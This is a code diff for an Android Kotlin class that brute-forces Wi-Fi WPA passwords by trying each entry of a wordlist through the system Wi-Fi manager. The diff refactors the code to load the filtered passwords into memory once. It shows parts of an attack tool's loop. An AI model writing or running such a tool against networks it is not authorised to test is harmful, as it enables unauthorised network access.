@@ -19,7 +19,6 @@ import java.io.BufferedReader
 import java.io.InputStreamReader
 import kotlin.coroutines.resume
 
-
 class NativePskBruteForceRunner(private val context: Context) {
 
     companion object {
@@ -49,24 +48,23 @@ class NativePskBruteForceRunner(private val context: Context) {
         val enabledNetworks = snapshotEnabledNetworks()
 
         try {
+            val passwords = mutableListOf<String>()
             val in1 = context.contentResolver.openInputStream(wordlistUri)
                 ?: return@withContext PskBruteForceResult(null, false, 0)
             BufferedReader(InputStreamReader(in1)).use { br ->
-                while (br.readLine() != null) totalLines++
-            }
-            Log.d(TAG, "Wordlist total lines: $totalLines")
-
-            val in2 = context.contentResolver.openInputStream(wordlistUri)
-                ?: return@withContext PskBruteForceResult(null, false, 0)
-            BufferedReader(InputStreamReader(in2)).use { br ->
                 var line: String?
                 while (br.readLine().also { line = it } != null) {
-                    if (cancelled) break
-                    val password = line!!.trim()
-                    if (password.isEmpty() || password.startsWith("#") || password.length < 8) {
-                        attempts++
-                        continue
+                    val trimmed = line!!.trim()
+                    if (trimmed.isNotEmpty() && !trimmed.startsWith("#") && trimmed.length >= 8) {
+                        passwords.add(trimmed)
                     }
+                }
+            }
+            totalLines = passwords.size
+            Log.d(TAG, "Wordlist total valid passwords: $totalLines")
+
+            for (password in passwords) {
+                    if (cancelled) break
 
                     attempts++
                     Log.d(TAG, "Attempt $attempts/$totalLines: trying '$password'")
@@ -103,7 +101,6 @@ class NativePskBruteForceRunner(private val context: Context) {
 
                     delay(ATTEMPT_DELAY_MS)
                 }
-            }
 
             Log.d(TAG, "=== NATIVE PSK BRUTE FORCE END (not found after $attempts attempts) ===")
             PskBruteForceResult(null, false, attempts)
@@ -162,7 +159,6 @@ class NativePskBruteForceRunner(private val context: Context) {
                 return Outcome.FAILED
             }
             wifiManager.disconnect()
-
 
             val outcome = waitForOutcome(ssid, bssid, netId) {
                 wifiManager.enableNetwork(netId, true)
